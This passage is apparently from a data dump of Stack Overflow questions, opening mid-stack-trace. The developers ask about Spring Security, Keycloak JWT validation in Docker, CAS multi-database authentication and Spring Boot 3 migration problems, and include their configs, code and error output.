    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.oauth2.server.resource.web.authentication.BearerTokenAuthenticationFilter.doFilterInternal(BearerTokenAuthenticationFilter.java:128) ~[spring-security-oauth2-resource-server-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:221) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at java.base/java.lang.Thread.run(Thread.java:840) ~[na:na]
</code></pre>
<p>I've tried a lot of ways, but none seem to work. At this point, I believe there's an issue with the authorization process. It seems like the subsequent pages(/authenticated/**) requiring a bearer token aren't receiving it properly. I attempted to follow the recommendations on the official website by manually setting up authentication, but the problem persists.</p>
<p>I hope someone can assist me in resolving this issue. Thank you.</p>
<p>I was trying to set authentication in login method but it seems the authentication information not propagate.</p>
"
"<p>I'm building a spring boot application with microservices and Keycloak for security and angular after dockerizing the app with a docker-compose. all requests requiring authorization, respond with &quot;unauthorized&quot; response</p>
<pre><code>spring.application.name=product-service
server.port=8086
spring.datasource.url=${DATABASE_SERVICE_URL:jdbc:postgresql://localhost:5432/productdb}
spring.datasource.username=gestion_bien_user
spring.datasource.password=root
spring.jpa.hibernate.ddl-auto=update
spring.cloud.discovery.enabled=true
eureka.instance.prefer-ip-address=false
eureka.client.service-url.defaultZone=${DISCOVERY_SERVICE_URL:http://localhost:8761/eureka}
spring.jpa.properties.hibernate.jdbc.time_zone = Africa/Casablanca
spring.security.oauth2.resourceserver.jwt.issuer-uri=${KEYCLOAK_SERVICE_URL_REALM:http://localhost:8890/realms/gestion_bien}
spring.security.oauth2.resourceserver.jwt.jwk-set-uri=${KEYCLOAK_SERVICE_URL_CERTS:http://localhost:8890/realms/gestion_bien/protocol/openid-connect/certs}
</code></pre>
<p>here is the security interface :</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    private JwtAuthConverter jwtAuthConverter;

    public SecurityConfig(JwtAuthConverter jwtAuthConverter) {
        this.jwtAuthConverter = jwtAuthConverter;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity)  throws Exception{
        return httpSecurity
                .cors(Customizer.withDefaults())
                .sessionManagement(sm-&gt;sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .csrf(csrf-&gt;csrf.disable())
                .authorizeHttpRequests(ar-&gt;ar.requestMatchers(&quot;/stag/**&quot;,&quot;/product&quot;,&quot;/product/**&quot;,&quot;/product/bs/**&quot;).permitAll()
                 .anyRequest().authenticated())
                .oauth2ResourceServer(ors-&gt;ors.jwt(jwt-&gt;jwt.jwtAuthenticationConverter(jwtAuthConverter)))
                .build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList(&quot;*&quot;));
        configuration.setAllowedMethods(Arrays.asList(&quot;*&quot;));
        configuration.setAllowedHeaders(Arrays.asList(&quot;*&quot;));
        configuration.setExposedHeaders(Arrays.asList(&quot;*&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }
}
</code></pre>
<p>and here is the keycloak and one service docker:</p>
<pre class=""lang-yaml prettyprint-override""><code>services:
  keycloak-service:
    image: quay.io/keycloak/keycloak:23.0.3
    command: start-dev
    environment:
      KC_DB: postgres
      KC_DB_URL_HOST: postgres_db
      KC_DB_URL_DATABASE: keycloak
      KC_DB_USERNAME: keycloak
      KC_DB_PASSWORD: password
      KC_HTTP_ENABLED: &quot;true&quot;
      KC_HOSTNAME_STRICT_HTTPS: &quot;false&quot;
      KC_DB_SCHEMA: public
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: admin
    ports:
      - &quot;8080:8080&quot;
    expose:
      - &quot;8080&quot;
    depends_on:
      postgres_db:
        condition: service_healthy
    networks:
      gestion-bien-network:
  gestion-bien-bien-service:
    build: ./bien-service
    container_name: gestion-bien-bien-service
    ports:
      - &quot;8086:8086&quot;
    expose:
      - &quot;8086&quot;
    environment:
      - DATABASE_SERVICE_URL=jdbc:postgresql://gestion-bien-database-service:5432/productdb
      - DISCOVERY_SERVICE_URL=http://gestion-bien-discovery-service:8761/eureka
      - KEYCLOAK_SERVICE_URL_REALM=http://keycloak-service:8080/realms/gestion_bien
      - KEYCLOAK_SERVICE_URL_CERTS=http://keycloak-service:8080/realms/gestion_bien/protocol/openid-connect/certs
    depends_on:
      - gestion-bien-discovery-service
      - gestion-bien-database-service
      - gestion-bien-bon-entre-service
    networks:
      gestion-bien-network:
  gestion-bien-bon-sortie-service:
    build: ./bon-sortie-service
    container_name: gestion-bien-bon-sortie-service
    ports:
      - &quot;8082:8082&quot;
    expose:
      - &quot;8082&quot;
    environment:
      - DATABASE_SERVICE_URL=jdbc:postgresql://gestion-bien-database-service:5432/exvdb
      - DISCOVERY_SERVICE_URL=http://gestion-bien-discovery-service:8761/eureka
      - KEYCLOAK_SERVICE_URL_REALM=http://keycloak-service:8080/realms/gestion_bien
      - KEYCLOAK_SERVICE_URL_CERTS=http://keycloak-service:8080/realms/gestion_bien/protocol/openid-connect/certs
    depends_on:
      - gestion-bien-discovery-service
      - gestion-bien-database-service
      - gestion-bien-bien-service
    networks:
      gestion-bien-network:
networks:
  gestion-bien-network:
    driver: bridge
volumes:
  pgdata:
</code></pre>
<p>and this is my realm on keycloak :</p>
<pre class=""lang-json prettyprint-override""><code>##http://localhost:8080/realms/gestion_bien/.well-known/openid-configuration

{
&quot;issuer&quot;: &quot;http://localhost:8080/realms/gestion_bien&quot;,
&quot;authorization_endpoint&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/auth&quot;,
&quot;token_endpoint&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/token&quot;,
&quot;introspection_endpoint&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/token/introspect&quot;,
&quot;userinfo_endpoint&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/userinfo&quot;,
&quot;end_session_endpoint&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/logout&quot;,
&quot;frontchannel_logout_session_supported&quot;: true,
&quot;frontchannel_logout_supported&quot;: true,
&quot;jwks_uri&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/certs&quot;,
&quot;check_session_iframe&quot;: &quot;http://localhost:8080/realms/gestion_bien/protocol/openid-connect/login-status-iframe.html&quot;,
&quot;grant_types_supported&quot;: [
&quot;authorization_code&quot;,
&quot;implicit&quot;,
&quot;refresh_token&quot;,
&quot;password&quot;,
&quot;client_credentials&quot;,
&quot;urn:openid:params:grant-type:ciba&quot;,
&quot;urn:ietf:params:oauth:grant-type:device_code&quot;
],.......
</code></pre>
<p>i tried to get response from my angular, and postman with no usefull results
I guess the problem occurred when the microservices tried to get the jwk from Keycloak
here is on of my application.properties:</p>
"
"<p>I used spring security for the login of my application. I used Maven, Spring Boot 3.2.3 and Java 17. I have got below error when Compilation of my project.</p>
<pre><code>java: cannot find symbol  

symbol:   class WebSecurityConfigurerAdapter

  location: package org.springframework.security.config.annotation.web.configuration
</code></pre>
<p>It says cannot find <code>WebSecurityConfigurerAdapter</code> I have added the dependencies also but still I am getting that error</p>
<p>I'm using <strong>intelliji</strong> as IDE.Below I have provide the code i tried to use Spring security</p>
<pre><code>package com.xyz.productdashboardlogin;

import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
@Configuration
@EnableWebSecurity
public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter{
}
</code></pre>
<p>And also below i will provide my <code>Pom.xml</code> file.</p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.3&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.xyz&lt;/groupId&gt;
    &lt;artifactId&gt;Product-Dashboard-Login&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;Product-Dashboard-Login&lt;/name&gt;
    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;com.mysql&lt;/groupId&gt;
            &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-web&lt;/artifactId&gt;

        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-config&lt;/artifactId&gt;

        &lt;/dependency&gt;
        

    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p>Are the <code>WebSecurityConfigurerAdapter</code> not working with newer versions of Spring?
I'm a beginner to the Spring Boot. Could you please help me to fix this issue?</p>
"
"<p>I'm currently implementing SSO using Apereo CAS 6.6.x. I have deployed CAS Server, connected two different services with CAS, and successfully logged in using database-based authentication.</p>
<p>I heard that CAS is designed to be scalable by decoupling the application and session storage for authentication, so I naturally thought that CAS Server should be connected to multiple databases.</p>
<p>I've looked at the official documentation to implement my idea, but it doesn't seem to be there, so I'm posting a question. The <code>application.yml</code> file I set up is as follows.</p>
<pre><code>cas:
  authn:
    jdbc:
      query[0]:
        driver-class: &quot;com.mysql.cj.jdbc.Driver&quot;
        url: &quot;jdbc:mysql://{My Public IP}:3306/test?autoReconnect=true&amp;allowMultiQuries=true&amp;serverTimezone=UTC&quot;
        sql: &quot;select id, login_id, login_pw from test.sso where login_id = ?;&quot;
        user: &quot;mysql&quot;
        password: &quot;root&quot;
        field-user: &quot;login_id&quot;
        field-password: &quot;login_pw&quot;
        password-encoder:
          type: &quot;NONE&quot;
      query[1]:
        driver-class: &quot;com.mysql.cj.jdbc.Driver&quot;
        url: &quot;jdbc:mysql://{My Public IP}:3306/test2?autoReconnect=true&amp;allowMultiQueries=true&amp;serverTimezone=UTC&quot;
        sql: &quot;select id, username, password from test2.kva_user where username = ?;&quot;
        user: &quot;mysql&quot;
        password: &quot;root&quot;
        field-user: &quot;username&quot;
        field-password: &quot;password&quot;
        password-encoder:
          type: &quot;NONE&quot;
</code></pre>
<p>However, CAS Server only fired the query for query[0] and did not react to query[1]. Intuitively, query[0] should have query[1], so I don't see why it shouldn't.</p>
<p>Here's one part of the official documentation I'm looking at, is this possible to implement what I want?</p>
<p><a href=""https://apereo.github.io/cas/6.6.x/integration/Attribute-Resolution-JDBC.html"" rel=""nofollow noreferrer"">link</a></p>
"
"<p><strong>SpringBoot</strong> Version : 3.1.8
<strong>Code</strong>:</p>
<p>SecurityConfiguration.java</p>
<pre><code>package com.example.TestRestAPI.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.provisioning.InMemoryUserDetailsManager;
import org.springframework.security.web.SecurityFilterChain;

@Configuration(&quot;SecurityConfiguration&quot;)
@EnableWebSecurity
public class SecurityConfiguration {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
                .csrf().disable() // Disabling CSRF protection
                .authorizeHttpRequests(authz -&gt; authz
                        .requestMatchers(&quot;/api/v1/**&quot;).hasRole(&quot;USER&quot;)
                        .anyRequest().denyAll() // Denying all other requests
                )
                .httpBasic(); // Using HTTP Basic authentication
        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        InMemoryUserDetailsManager manager = new InMemoryUserDetailsManager();
        manager.createUser(User.withDefaultPasswordEncoder().username(&quot;user&quot;).password(&quot;password&quot;).roles(&quot;USER&quot;).build());
        return manager;
    }
}

</code></pre>
<p>RESTApiController.java</p>
<pre><code>package com.example.TestRestAPI.controller;

import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import java.util.ArrayList;
import java.util.List;

@RestController
@RequestMapping(&quot;/api/v1/sayHello&quot;)
public class RESTApiController {
    private static final String CONTENT_TYPE_APPLICATION_ZIP = &quot;application/zip&quot;;
    @GetMapping(produces = { MediaType.TEXT_PLAIN_VALUE, CONTENT_TYPE_APPLICATION_ZIP })
    public String sayHello1(@RequestHeader(&quot;Accept&quot;) List&lt;String&gt; acceptHeader) throws MyException {
        List&lt;String&gt; acceptTypes = new ArrayList&lt;&gt;(acceptHeader);
        // remove all acceptable types from the list
        acceptTypes.remove(CONTENT_TYPE_APPLICATION_ZIP);
        acceptTypes.remove(MediaType.TEXT_PLAIN_VALUE);
        acceptTypes.remove(MediaType.APPLICATION_JSON_VALUE);
        // anything left is unacceptable
        if (!acceptTypes.isEmpty()) {
            throw new MyException(&quot;Error in content-type&quot;);
        }
        return &quot;{'greeting':'Hello!'}&quot;;
    }
}
</code></pre>
<p>RestControllerAdvice</p>
<pre><code>package com.example.TestRestAPI.controller;

import org.springframework.http.HttpStatus;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.ResponseStatus;
import org.springframework.web.bind.annotation.RestControllerAdvice;


@RestControllerAdvice(&quot;com.example.TestRestAPI.controller&quot;)
public class RESTApiAdviser {

    @ResponseStatus(HttpStatus.NOT_ACCEPTABLE)
    @ExceptionHandler(MyException.class)
    @ResponseBody
    public ErrorInfo handleMyException(MyException ex){
          return new ErrorInfo (HttpStatus.NOT_ACCEPTABLE.value(), &quot;Error in content-type&quot;);
    }
}

</code></pre>
<p>Custom exception</p>
<pre><code>package com.example.TestRestAPI.controller;

public class MyException extends Exception {

    public MyException(String message) {
        super(message);
    }
    public MyException (String message, Throwable cause) {
        super(message, cause);
    }
}

</code></pre>
<p>ErrorInfo</p>
<pre><code>package com.example.TestRestAPI.controller;

import lombok.Data;

/**
 * Common representation of an error
 */
@Data
public class ErrorInfo {
      private final Integer status;
      private final String detail;
      private String type;
      private String title;
      private String instance;
}
</code></pre>
<p>application.yaml</p>
<pre><code>spring:
  mvc:
    problemdetails:
      enabled: true

</code></pre>
<p>The below testcase(<code>testInvalidAcceptHeadersWithoutJsonType</code>) for my controller was working fine with springboot 2,</p>
<pre><code>package com.example.TestRestAPI.controller;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.core.io.Resource;
import org.springframework.http.*;

import java.util.Arrays;

import static org.assertj.core.api.Assertions.assertThat;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class RESTApiControllerTest {

    @Autowired
    TestRestTemplate testRestTemplate;


    @Test
    public void testInvalidAcceptHeadersWithoutJsonType(){
        HttpHeaders headers = new HttpHeaders();
        headers.setAccept(Arrays.asList(MediaType.parseMediaType(&quot;application/zip&quot;), MediaType.TEXT_PLAIN, MediaType.APPLICATION_OCTET_STREAM));
        HttpEntity&lt;String&gt; httpEntity = new HttpEntity&lt;&gt;(headers);
        ResponseEntity&lt;?&gt; responseEntity = testRestTemplate.withBasicAuth(&quot;user&quot;,&quot;password&quot;)
                .exchange(&quot;/api/v1/sayHello&quot;, HttpMethod.GET,  httpEntity, Resource.class);
        assertThat(responseEntity.getStatusCode()).isEqualTo(HttpStatus.NOT_ACCEPTABLE);
    }
}

</code></pre>
<p>but after upgrade to springboot 3 it failing as instead of 406 getting 403, gives below error</p>
<pre><code>org.springframework.web.HttpMediaTypeNotAcceptableException: No acceptable representation at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:256) ~[spring-webmvc-6.0.14.jar:6.0.14] at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.handleReturnValue(RequestResponseBodyMethodProcessor.java:194) ~[spring-webmvc-6.0.14.jar:6.0.14]
</code></pre>
<p>When I update my testcase as below, its working fine</p>
<pre><code> @Test
    public void testInvalidAcceptHeadersWithJsonType(){
        HttpHeaders headers = new HttpHeaders();
        headers.setAccept(Arrays.asList(MediaType.parseMediaType(&quot;application/zip&quot;), MediaType.TEXT_PLAIN, MediaType.APPLICATION_OCTET_STREAM, MediaType.APPLICATION_JSON));
        HttpEntity&lt;String&gt; httpEntity = new HttpEntity&lt;&gt;(headers);
        ResponseEntity&lt;?&gt; responseEntity = testRestTemplate.withBasicAuth(&quot;user&quot;,&quot;password&quot;)
                .exchange(&quot;/api/v1/sayHello&quot;, HttpMethod.GET,  httpEntity, Resource.class);
        assertThat(responseEntity.getStatusCode()).isEqualTo(HttpStatus.NOT_ACCEPTABLE);
    }
</code></pre>
<p>Am I missing any changes needed for springboot3.</p>
"
"<p>I'm developing a management equipment website for my personal project.  When fetching equipment data, apply filtering based on the user's role:
For regular users, filter equipment based on their department.
